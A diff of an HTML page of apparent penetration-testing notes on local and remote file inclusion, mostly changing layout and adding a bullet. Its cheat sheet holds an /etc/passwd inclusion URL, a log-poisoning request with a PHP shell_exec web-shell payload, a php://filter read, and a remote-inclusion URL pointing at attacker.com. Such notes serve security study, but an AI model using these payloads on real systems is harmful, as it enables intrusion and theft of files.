@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -76,8 +76,7 @@
 
 
 <!--==================== MAIN ====================-->
-    <main class="main"><article id="9a426f51-e2cd-4d16-afec-a4ca048bb9ed" class="page sans"><header><h1 class="page-title">LFI/RFI</h1></header><div class="page-body"><p id="920f1531-0c6e-49dd-8474-443c3c3f8f37" class="">
-</p><p id="120d0b60-0b38-47ea-a1af-883a9d5172ac" class="">LFI Example:</p><pre id="906900c8-dcc1-48d6-970c-dfd6ad588198" class="code"><code>http://example.com/index.php?page=/etc/passwd</code></pre><p id="0f8e15b5-2890-4239-9069-f403437765c0" class="">LFI Log poisoning</p><pre id="f05d10de-ee45-492b-bf35-c2e8a749b808" class="code"><code>Example in Burp Suite:
+    <main class="main"><article id="9a426f51-e2cd-4d16-afec-a4ca048bb9ed" class="page sans"><header><h1 class="page-title">LFI/RFI</h1></header><div class="page-body"><ul id="920f1531-0c6e-49dd-8474-443c3c3f8f37" class="bulleted-list"><li style="list-style-type:disc">LFI/RFI is different than directory traversal<ul id="9c9f8184-22ab-4e1f-bcbe-74ede956d600" class="bulleted-list"><li style="list-style-type:circle">LFI/RFI requires inclusion and execution of files being traversed</li></ul></li></ul><p id="120d0b60-0b38-47ea-a1af-883a9d5172ac" class="">LFI Example:</p><pre id="906900c8-dcc1-48d6-970c-dfd6ad588198" class="code"><code>http://example.com/index.php?page=/etc/passwd</code></pre><p id="0f8e15b5-2890-4239-9069-f403437765c0" class="">LFI Log poisoning</p><pre id="f05d10de-ee45-492b-bf35-c2e8a749b808" class="code"><code>Example in Burp Suite:
 GET /file.php?file=../../../../var/log/apache2/access.log&amp;cmd=cat+var/www/file
 #User agent
 User-Agent: &lt;?php echo &#x27;&lt;pre&gt;&#x27; . shell_exec($_GET[&#x27;cmd&#x27;]) . &#x27;&lt;/pre&gt;&#x27;;?&gt;
@@ -98,8 +97,8 @@ for line in sys.stdin:
         unencoded += line
  
 print(urllib.parse.quote(unencoded.rstrip(&#x27;\n\r&#x27;), safe=&#x27;&#x27;), end=&#x27;&#x27;)</code></pre><p id="433d934b-d14c-49b8-a5bd-6ca0a13bfa47" class="">http://0.0.0.0/index.php?php://filter/convert.base64-encode/resource=file.php</p><p id="77c1eace-949b-4cc8-ba16-8a51095acbf3" class="">
-</p><p id="ebb90320-6ad1-4f32-940f-374e120a55de" class="">
-</p><p id="fb6a5041-8bdd-4e19-bc61-a0e31429be16" class=""><strong>RFI Example:</strong></p><pre id="ebb45e6d-1e3f-4122-a0cb-4a9012d78abd" class="code"><code>http://example.com/index.php?url=http://attacker.com/malicious.php</code></pre></div></article></main></main>
+</p><p id="fb6a5041-8bdd-4e19-bc61-a0e31429be16" class=""><strong>RFI Example:</strong></p><pre id="ebb45e6d-1e3f-4122-a0cb-4a9012d78abd" class="code"><code>http://example.com/index.php?url=http://attacker.com/malicious.php</code></pre><p id="89d3491b-d64a-48ab-93bd-1adf59e80024" class="">
+</p></div></article></main></main>
 
     <!--==================== FOOTER ====================-->
     <footer class="footer">
